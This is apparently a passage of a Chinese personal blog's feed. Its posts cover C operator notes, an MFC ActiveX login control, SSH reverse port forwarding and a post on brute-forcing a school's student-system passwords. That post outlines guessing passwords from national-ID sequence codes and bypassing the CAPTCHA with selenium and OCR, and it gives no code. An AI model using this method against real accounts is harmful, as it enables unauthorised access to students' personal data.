c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    a=<span class="number">7</span>;</span><br><span class="line">    b=<span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,a^b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>样例输出</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure><h3 id="12-4-取反"><a href="#12-4-取反" class="headerlink" title="12.4 取反(~)"></a>12.4 取反(~)</h3><p><strong>代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    a=<span class="number">7</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%x"</span>,~a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>样例输出</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fffffff8</span><br></pre></td></tr></table></figure><h3 id="12-5-移位运算"><a href="#12-5-移位运算" class="headerlink" title="12.5 移位运算"></a>12.5 移位运算</h3><p><strong>代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    a=<span class="number">7</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%x"</span>,a&gt;&gt;<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>样例输出</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="常用C库函数"><a href="#常用C库函数" class="headerlink" title="常用C库函数"></a>常用C库函数</h2><h3 id="1-数学函数"><a href="#1-数学函数" class="headerlink" title="1. 数学函数"></a>1. 数学函数</h3><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span> 或 #<span class="meta-keyword">include</span> <span class="string">"math.h"</span></span></span><br></pre></td></tr></table></figure><table><thead><tr><th>函数名</th><th>功能</th><th>函数原型</th></tr></thead><tbody><tr><td>abs</td><td>绝对值</td><td>int abs(intx);</td></tr><tr><td>fabs</td><td>绝对值</td><td>double fabs(double x);</td></tr><tr><td>exp</td><td>e^x</td><td>double exp(double x);</td></tr><tr><td>floor</td><td>不大于x的最大整数</td><td>double floor(double x);</td></tr><tr><td>log</td><td>lnx</td><td>double log(double x);</td></tr><tr><td>log10</td><td>lgx</td><td>double log10(double x);</td></tr><tr><td>pow</td><td>x^y</td><td>douoble pow(double x, double y);</td></tr><tr><td>sqrt</td><td>√x</td><td>double sqrt(double x);</td></tr></tbody></table><p>计算log<del>2</del>n，使用换底公式</p><img src="/2020/01/26/C_C++_01/20200316134155.png" alt="image-20200316134153930" style="zoom: 80%;"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">log</span>(n)/<span class="built_in">log</span>(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><h3 id="2-字符函数"><a href="#2-字符函数" class="headerlink" title="2. 字符函数"></a>2. 字符函数</h3><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br></pre></td></tr></table></figure><table><thead><tr><th>函数名</th><th>功能</th><th>函数原型</th></tr></thead><tbody><tr><td>isanum</td><td>判断是否数字</td><td>int isanum(int ch);</td></tr><tr><td>islower</td><td>判断是否小写字母</td><td>int islower(int ch);</td></tr><tr><td>isupper</td><td>判断是否大写字母</td><td>int isupper(int ch);</td></tr></tbody></table><h3 id="3-字符串函数"><a href="#3-字符串函数" class="headerlink" title="3. 字符串函数"></a>3. 字符串函数</h3><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="/2020/01/26/C_C++_01/20200304154926.png" alt></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">memset</span><span class="params">(<span class="keyword">void</span> *s, <span class="keyword">int</span> c, <span class="keyword">unsigned</span> <span class="keyword">long</span> n)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="4-输入输出函数"><a href="#4-输入输出函数" class="headerlink" title="4. 输入输出函数"></a>4. 输入输出函数</h3><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="/2020/01/26/C_C++_01/20200304155309.png" alt></p><h3 id="5-存储动态分配函数"><a href="#5-存储动态分配函数" class="headerlink" title="5. 存储动态分配函数"></a>5. 存储动态分配函数</h3><p><img src="/2020/01/26/C_C++_01/20200304155422.png" alt></p><h2 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h2><p><img src="/2020/01/26/C_C++_01/20200401135705.png" alt="image-20200401135701567"></p><p>同一优先级的运算符，结合次序由结合方向所决定。</p><p>简单记就是：！ &gt; 算术运算符 &gt; 关系运算符 &gt; &amp;&amp; &gt; || &gt; 赋值运算符</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;大一学习的 C 语言，现在回过头来发现已经忘的差不多了，正好趁着这个机会复习整理下，本文的目的偏向于整理备忘，讲解的部分会占很少。&lt;/p&gt;
&lt;p&gt;目录及相关习题参考 《C程序设计（第四版）》谭浩强&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Code" scheme="https://jlkl.github.io/tags/Code/"/>
    
      <category term="C/C++" scheme="https://jlkl.github.io/tags/C-C/"/>
    
  </entry>
  
  <entry>
    <title>用户注册和登录ActiveX控件</title>
    <link href="https://jlkl.github.io/2019/06/06/Code_01/"/>
    <id>https://jlkl.github.io/2019/06/06/Code_01/</id>
    <published>2019-06-06T13:39:53.000Z</published>
    <updated>2020-01-27T09:08:28.353Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>起初和老师商讨了一下，打算从属性页入手，设计一个综合的包含登录注册框的完整的控件。后来发现属性页只能在开发的时候调出（网上找到了一些解决方法但是没有调试出），对windows程序设计也不太熟。后来还是采用了最初想到的调用控件提供的方法进行登录注册的方法，登录和注册模块分别提供 UserLogin 和 UserRegister 方法，相关登录注册信息作为参数。</p><a id="more"></a><h2 id="0x01-需求"><a href="#0x01-需求" class="headerlink" title="0x01 需求"></a>0x01 需求</h2><p>采用ActiveX控件编程技术，完成下面ActiveX控件。</p><p>1）完成一个用户注册ActiveX控件（用户名、密码、邮箱、生日、身份证、手机等相关新），其中用户名、密码、身份证、手机等相关数据类型验证）。并调用ActiveX控件进行功能演示。</p><p>2）完成一个用户登录的控件ActiveX控件，要求用户名，用户密码（用户密码设置为软键盘输入），验证码。并进行ActiveX控件调用演示，可以不使用数据库存储，例如文件存放用户名和密码，进行登录。</p><p>平台要求：采用 MFC ActiveX编写，界面可以其他编程语言</p><h2 id="0x02-总体设计"><a href="#0x02-总体设计" class="headerlink" title="0x02 总体设计"></a>0x02 总体设计</h2><h3 id="2-1-登录模块设计"><a href="#2-1-登录模块设计" class="headerlink" title="2.1 登录模块设计"></a>2.1 登录模块设计</h3><p>创建一个自定义方法 UserLogin ，将用户名，密码作为参数</p><p><img src="/2019/06/06/Code_01/20190606214348.png" alt></p><p>登录模块相较于注册模块简单，函数流程如下</p><p><img src="/2019/06/06/Code_01/20190606214431.png" alt></p><p>用户名格式检验使用正则表达式。使用 GetUser_Password 函数获取文件每一行对应的用户名密码，然后进行判断。具体可以参数注册模块设计。</p><p><img src="/2019/06/06/Code_01/20190606214454.png" alt></p><h3 id="2-2-注册模块设计"><a href="#2-2-注册模块设计" class="headerlink" title="2.2 注册模块设计"></a>2.2 注册模块设计</h3><p>创建一个自定义方法 UserRegister ，将用户名，密码，邮箱等信息作为参数</p><p><img src="/2019/06/06/Code_01/20190606214520.png" alt></p><p>函数大致流程如图</p><p><img src="/2019/06/06/Code_01/20190606214534.png" alt></p><p>从MFC传递过来的信息为CString类型，注意类型转换</p><h4 id="2-2-1-格式检验"><a href="#2-2-1-格式检验" class="headerlink" title="2.2.1 格式检验"></a>2.2.1 格式检验</h4><p><img src="/2019/06/06/Code_01/20190606214559.png" alt></p><p>regex 库，使用正则表达式的方式对用户信息进行格式校验，reg1 存储正则表达式，rerResult1 存储匹配到的字符串，bValid1 存储判断的结果，最后再判断匹配结果就可以了。验证邮箱，身份证号，手机也是同样的。、</p><h4 id="2-2-2-判断是否已经注册"><a href="#2-2-2-判断是否已经注册" class="headerlink" title="2.2.2 判断是否已经注册"></a>2.2.2 判断是否已经注册</h4><p><img src="/2019/06/06/Code_01/20190606214626.png" alt></p><p>从文件中一行一行地读取，GetUser_Password 函数获取每一行对应的用户名和密码，然后通过 strcmp 函数比较两个字符串是否相等来判断是否已经注册。</p><p>GetUser_Password 函数实现如下，二阶指针便于传递参数。也是通过正则的方式匹配，rerResult.str(1) 获取第一个匹配到的子串，即用户名。rerResult.str(2) 获取第二个匹配到的子串，即密码。然后通过二阶指针的方式传递变量。</p><p><img src="/2019/06/06/Code_01/20190606214646.png" alt></p><p>最后简单的 c 语言文件操作将注册信息写入到文件中</p><p><img src="/2019/06/06/Code_01/20190606214701.png" alt></p><p>文件存储格式如下</p><p><img src="/2019/06/06/Code_01/20190606214714.png" alt></p><h3 id="2-3-MFC-应用程序设计"><a href="#2-3-MFC-应用程序设计" class="headerlink" title="2.3 MFC 应用程序设计"></a>2.3 MFC 应用程序设计</h3><p>使用了标签控件Tab Control 来切换登录和注册窗口，具体使用方法可以参见附录。</p><p><img src="/2019/06/06/Code_01/20190606214755.png" alt></p><p><img src="/2019/06/06/Code_01/20190606214851.png" alt></p><p>添加 AxtiveX 控件并绑定变量，调用其他 MFC 控件获取用户输入，最后调用 AxtiveX 控件的 UserLogin 方法就可以了。</p><h4 id="2-3-1-获取验证码"><a href="#2-3-1-获取验证码" class="headerlink" title="2.3.1 获取验证码"></a>2.3.1 获取验证码</h4><p>GetRand 函数随机生成一个 4 位字符串存储于变量 randcheckcode 中，之后调用 MFC 接口 GetDlgItem 获取 ID 号为 IDC_BUTTON3 的按钮句柄，再设置 caption 为验证码，以显示出来。</p><p><img src="/2019/06/06/Code_01/20190606214912.png" alt></p><h4 id="2-3-2-软键盘输入用户密码"><a href="#2-3-2-软键盘输入用户密码" class="headerlink" title="2.3.2 软键盘输入用户密码"></a>2.3.2 软键盘输入用户密码</h4><p>考虑了调用系统软键盘的方式，但是测试了ShellExec 和 CreateProcess，都只能打开记事本，不能打开软键盘。</p><p><a href="https://blog.csdn.net/flushhip/article/details/83008317" target="_blank" rel="noopener">https://blog.csdn.net/flushhip/article/details/83008317</a></p><p>按这篇文章的说法是 32 位程序运行在 64 位环境下会重定向 SysWOW64 下，而这个目录下没有 osk.exe 所以调用失败，但是我尝试了文章的解决方法，也把 osk.exe 复制过去了，还是打不开。无奈只能自己手写一个软键盘。</p><p>以按钮 “q” 为例，维护了一个全局 CString 变量 password，点击按钮 “q” 时，向这个字符串添加字符 “q”， displaypassword 用于在页面上显示。有点投机取巧，而且这种方法很麻烦，每一个字符需对应一个按钮。</p><p><img src="/2019/06/06/Code_01/20190606214951.png" alt></p><h4 id="2-3-3-用户登录"><a href="#2-3-3-用户登录" class="headerlink" title="2.3.3 用户登录"></a>2.3.3 用户登录</h4><p>首先判断验证码是否正确，然后将输入信息作为参数传递给 UserLogin 函数。这里需要注意第一行 UpdateData() 是必需的，他的作用是将用户在输入框输入内容同步到绑定的变量。</p><p><img src="/2019/06/06/Code_01/20190606215013.png" alt></p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>C 和 C++ 一个难点在于类型的转换，好在网上都能找到比较方便简洁的转换方法。由于ActiveX 控件不能直接下断点调试，只能将代码提到MFC应用程序中调试，很费时间。</p><p>软键盘实现密码登录那里并不是最优解法，没有调用到系统自带或第三方的软键盘，很浪费资源。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] UniCode下CString转char* 的方法  <a href="https://blog.csdn.net/neverup_/article/details/5664733" target="_blank" rel="noopener">https://blog.csdn.net/neverup_/article/details/5664733</a></p><p>[2] 标签控件Tab Control  <a href="http://www.jizhuomi.com/software/207.html" target="_blank" rel="noopener">http://www.jizhuomi.com/software/207.html</a></p><p>[3] MFC连接mysql登录注册  <a href="https://blog.csdn.net/qq_29503183/article/details/81257983" target="_blank" rel="noopener">https://blog.csdn.net/qq_29503183/article/details/81257983</a></p><p>[4] 一个视图显示ActiveX控件的属性页<a href="https://www.xuebuyuan.com/846502.html?mobile=0" target="_blank" rel="noopener">https://www.xuebuyuan.com/846502.html?mobile=0</a></p><p>[5] regex 类的使用 <a href="https://blog.csdn.net/l357630798/article/details/78235307" target="_blank" rel="noopener">https://blog.csdn.net/l357630798/article/details/78235307</a></p><p>[6] windwos调用系统软键盘   <a href="https://blog.csdn.net/flushhip/article/details/83008317" target="_blank" rel="noopener">https://blog.csdn.net/flushhip/article/details/83008317</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;起初和老师商讨了一下，打算从属性页入手，设计一个综合的包含登录注册框的完整的控件。后来发现属性页只能在开发的时候调出（网上找到了一些解决方法但是没有调试出），对windows程序设计也不太熟。后来还是采用了最初想到的调用控件提供的方法进行登录注册的方法，登录和注册模块分别提供 UserLogin 和 UserRegister 方法，相关登录注册信息作为参数。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Code" scheme="https://jlkl.github.io/tags/Code/"/>
    
  </entry>
  
  <entry>
    <title>Socks 代理实现抢课</title>
    <link href="https://jlkl.github.io/2019/05/04/Other-01/"/>
    <id>https://jlkl.github.io/2019/05/04/Other-01/</id>
    <published>2019-05-04T07:48:26.000Z</published>
    <updated>2019-05-04T07:53:04.545Z</updated>
    
    <content type="html"><![CDATA[<p>闲来无事逛微信，关于流量转发发现了一个思路特别新奇的用法</p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20190504153543.png" width="80%"><p>将应用层问题转移到传输层，解决了多并发时 TCP 握手失败的问题</p><p>网上找了一下，发现已经有人写出了实例脚本，有时间再仔细研究下</p><ul><li><a href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&mid=2247486283&idx=1&sn=674338ea3a2a5920d0100dcbbe768292&chksm=fbf7913bcc80182dadbcba4ca7946b19409927d8249f251ccc907803c3fabc2b2703bb770571&scene=0&xtrack=1&ascene=14&devicetype=android-22&version=27000034&nettype=WIFI&abtest_cookie=BAABAAoACwASABMABQAjlx4AW5keAMqZHgDcmR4A85keAAAA&lang=zh_CN&pass_ticket=lkKV7ifl71QUSP6oYpXEwtKKjR2RFyaCLemWC5bPUxJ4bnY1u%2BvvefDYjuuN3G5S&wx_header=1" target="_blank" rel="noopener">流量转发的应用与实现 -  安恒网络空间安全</a></li><li><a href="http://iv4n.xyz/Rob-Lessons/" target="_blank" rel="noopener">CUMT公选课抢课脚本</a></li><li><a href="https://github.com/EddieIvan01/lessons-robber" target="_blank" rel="noopener">https://github.com/EddieIvan01/lessons-robber</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;闲来无事逛微信，关于流量转发发现了一个思路特别新奇的用法&lt;/p&gt;
&lt;img src=&quot;https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20190504153543.png&quot; width=&quot;80%&quot;&gt;

&lt;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>ssh端口转发内网到公网</title>
    <link href="https://jlkl.github.io/2019/04/17/Web_14/"/>
    <id>https://jlkl.github.io/2019/04/17/Web_14/</id>
    <published>2019-04-17T15:03:50.000Z</published>
    <updated>2019-05-07T08:49:20.204Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>起因是想要在家里或者使用流量能够访问校园网抢课以及其他操作，路由器刷的华硕固件，正好有搭建 ss 服务器的功能。</p><p>百度一下大概的实现方式，大多都是采用 ngrok 或者花生壳内网穿透的方式，实际测试了一下，ngrok 免费的服务很难连接上且不稳定。花生壳直接是付费服务。自己搭建 ngrok 又需要一个域名。</p><p>结合专业知识，只需要将 ss 服务的端口转发到公网上就可以了，所以最终采用了 ssh端口转发+ss-server 的方式，不得不推一下，ssh端口转发真的很方便快捷 :P</p><a id="more"></a><h2 id="ssh端口转发"><a href="#ssh端口转发" class="headerlink" title="ssh端口转发"></a>ssh端口转发</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh -NfR port_on_your_vps:<span class="number">192.168</span><span class="number">.123</span><span class="number">.1</span>:<span class="number">80</span> <span class="symbol">username@</span>*.*.*.*</span><br><span class="line"></span><br><span class="line">-R 远程转发</span><br><span class="line">-N ssh连接之后不执行命令</span><br><span class="line">-f 验证密码之后再后台运行</span><br></pre></td></tr></table></figure><p>这个有个坑点，在默认没有进行设置的情况下直接转发，在 vps 上反向代理的 lookup 的 ip 即 127.0.0.1，并不是公网 ip，在姜哥的指点下了解了这个点。</p><p>解决方法：<br>首先 ssh 登录到公网主机，修改 sshd 的配置文件 <code>/etc/ssh/sshd_config</code>，加入如下选项</p><p><code>GatewayPorts yes</code></p><p>然后重启 ssh 服务，<code>service sshd restart</code></p><p>可以参照：<a href="http://www.netcan666.com/2016/09/28/ssh%E9%9A%A7%E9%81%93%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E5%88%B0%E5%85%AC%E7%BD%91%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" target="_blank" rel="noopener">http://www.netcan666.com/2016/09/28/ssh%E9%9A%A7%E9%81%93%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E5%88%B0%E5%85%AC%E7%BD%91%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</a></p><p>每次登陆都需要设置密码太麻烦，设置免密登录</p><p>华硕固件中 ssh 服务采用的 Dropbear，没有 ssh-keygen，可用 dropbearkey 替代</p><p><code>dropbearkey -t rsa -f .ssh/id_dropbear_rsa | grep &quot;ssh-rsa&quot; &gt; .ssh/id_dropbear_rsa.pub</code></p><p>生成公私匙，将公匙 id_dropbear_rsa.pub 上传到 vps，具体可以参照</p><p><a href="https://my.oschina.net/u/2306127/blog/3027225" target="_blank" rel="noopener">https://my.oschina.net/u/2306127/blog/3027225</a></p><p>最后写了个脚本，然后设置了定时执行，舒服了。<code>-i</code> 参数指定的是 ssh 的私匙，这个要注意</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">#copyright by Str3am</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#kill掉全部ssh命令</span></span><br><span class="line">logger -t <span class="string">"ssh端口转发"</span> <span class="string">"结束ssh进程"</span></span><br><span class="line">killall ssh</span><br><span class="line"></span><br><span class="line"><span class="comment">#转发后台</span></span><br><span class="line">ssh -yNfR port_on_your_vps:192.168.123.1:80 username@*.*.*.* -i /etc/storage/.ssh/id_dropbear_rsa -K 1</span><br><span class="line"></span><br><span class="line"><span class="comment">#转发ss服务器端口</span></span><br><span class="line">ssh -yNfR port_on_your_vps:192.168.123.1:2333 username@*.*.*.* -i /etc/storage/.ssh/id_dropbear_rsa -K 1</span><br><span class="line">logger -t <span class="string">"ssh端口转发"</span> <span class="string">"成功转发端口"</span></span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="http://lypto.me/2018/12/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" target="_blank" rel="noopener">端口转发方式总结</a></li><li><a href="http://einverne.github.io/post/2017/05/ssh-keep-alive.html" target="_blank" rel="noopener">保持ssh登录</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;起因是想要在家里或者使用流量能够访问校园网抢课以及其他操作，路由器刷的华硕固件，正好有搭建 ss 服务器的功能。&lt;/p&gt;
&lt;p&gt;百度一下大概的实现方式，大多都是采用 ngrok 或者花生壳内网穿透的方式，实际测试了一下，ngrok 免费的服务很难连接上且不稳定。花生壳直接是付费服务。自己搭建 ngrok 又需要一个域名。&lt;/p&gt;
&lt;p&gt;结合专业知识，只需要将 ss 服务的端口转发到公网上就可以了，所以最终采用了 ssh端口转发+ss-server 的方式，不得不推一下，ssh端口转发真的很方便快捷 :P&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Web" scheme="https://jlkl.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>某学工网系统密码爆破</title>
    <link href="https://jlkl.github.io/2019/04/07/Python-04/"/>
    <id>https://jlkl.github.io/2019/04/07/Python-04/</id>
    <published>2019-04-07T08:16:35.000Z</published>
    <updated>2020-01-27T09:10:22.753Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前一直有爆破学校学工网系统密码的念头，错过了用户名和密码都是学号的大好时机。</p><p>经过一番安全审查后，默认密码更改为身份证后六位，考虑了一下，还是可以爆破的，增加了时间成本。</p><p>知识点：</p><ul><li>selenium 使用</li><li>tesserocr 识别图形化验证码</li><li>python 命令行参数 getopt 提取</li></ul><p><a href="http://www.runoob.com/python/python-command-line-arguments.html" target="_blank" rel="noopener">http://www.runoob.com/python/python-command-line-arguments.html</a></p><a id="more"></a><h2 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h2><p>之前的思路，抓取登录的请求包然后更改密码参数就可以实现爆破，但这个网站实际上并没有这么简单。</p><p>密码传输采取了 RSA 加密，<code>__VIEWSTATE</code> 和 <code>__EVENTVALIDATION</code> 两个参数也是随着每次访问刷新的。服务器采用的 java 架构，猜测可能和验证网页访问有关。</p><p><img src="/2019/04/07/Python-04/20190407153727.png" alt></p><p>测试了一下，对输入的密码进行 RSA 加密，然后在 burp 里提交，刚开始几次还可以提交，连续几次或隔了一段时间后服务器提示 500 错误。</p><p>对于此类 js 处理输入参数，可以将其加密逻辑改为 python 代码同样处理参数，也可以用调用第三方模块运行 js 代码获取结果。</p><p>其余两个动态参数的分析还有服务器 500 的错误搞的很心烦，最后改用了 selenium 爆破的方式。</p><h2 id="0x02-核心代码"><a href="#0x02-核心代码" class="headerlink" title="0x02 核心代码"></a>0x02 核心代码</h2><p>大概思路：访问登录界面 -&gt; 输入用户名密码 -&gt; 提取验证码识别并输入 -&gt; 点击登录判断验证结果</p><p>难点大概在于密码的生成，和身份证有关还有验证码的识别。身份证编码可以参考这篇文章：</p><p><a href="https://zhuanlan.zhihu.com/p/27056281" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/27056281</a></p><p>后四位的前三位为顺序码，对应该区域同一天出生的婴儿的个数，单数对应男孩，双数对应女孩。以顺序码作为轮询生成密码</p><p><img src="/2019/04/07/Python-04/20190407155808.png" alt></p><p>调用 tesserocr 识别验证码</p><p><img src="/2019/04/07/Python-04/20190407160009.png" alt></p><h2 id="0x05-问题记录"><a href="#0x05-问题记录" class="headerlink" title="0x05 问题记录"></a>0x05 问题记录</h2><h3 id="5-1-验证码定位"><a href="#5-1-验证码定位" class="headerlink" title="5.1 验证码定位"></a>5.1 验证码定位</h3><p>对网页内容进行截图，获取验证码元素在 html 页面的位置，根据这个位置裁剪截图。但是实际运用的时候，截取出的验证码位置大小不对，最后还是只有一点一点调整截取，猜测可能可 html 元素 margin，padding有关</p><h3 id="5-2-判断弹框"><a href="#5-2-判断弹框" class="headerlink" title="5.2 判断弹框"></a>5.2 判断弹框</h3><p>密码或验证码输入错误会弹窗提示，提示的时候不能对 brower 对象进行操作，否则会报错，使用了网上的代码对弹框进行判断</p><p><img src="/2019/04/07/Python-04/20190407161328.png" alt></p><h2 id="0x04-to-be-continue"><a href="#0x04-to-be-continue" class="headerlink" title="0x04 to be continue"></a>0x04 to be continue</h2><p>实际测试的时候发现 tesserocr 识别的准确率还是有点低</p><ul><li>不打开浏览器窗口，是否还能正确截图</li><li>多线程优化<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2></li><li><a href="https://www.jianshu.com/p/75150d52da9e" target="_blank" rel="noopener">https://www.jianshu.com/p/75150d52da9e</a></li><li><a href="https://cloud.tencent.com/developer/article/1061418" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1061418</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;之前一直有爆破学校学工网系统密码的念头，错过了用户名和密码都是学号的大好时机。&lt;/p&gt;
&lt;p&gt;经过一番安全审查后，默认密码更改为身份证后六位，考虑了一下，还是可以爆破的，增加了时间成本。&lt;/p&gt;
&lt;p&gt;知识点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;selenium 使用&lt;/li&gt;
&lt;li&gt;tesserocr 识别图形化验证码&lt;/li&gt;
&lt;li&gt;python 命令行参数 getopt 提取&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href=&quot;http://www.runoob.com/python/python-command-line-arguments.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.runoob.com/python/python-command-line-arguments.html&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Code" scheme="https://jlkl.github.io/tags/Code/"/>
    
      <category term="Python" scheme="https://jlkl.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>(半)自动批量添加QQ好友</title>
    <link href="https://jlkl.github.io/2019/03/22/Python_03/"/>
    <id>https://jlkl.github.io/2019/03/22/Python_03/</id>
    <published>2019-03-22T07:28:36.000Z</published>
    <updated>2020-01-27T09:10:17.239Z</updated>
    
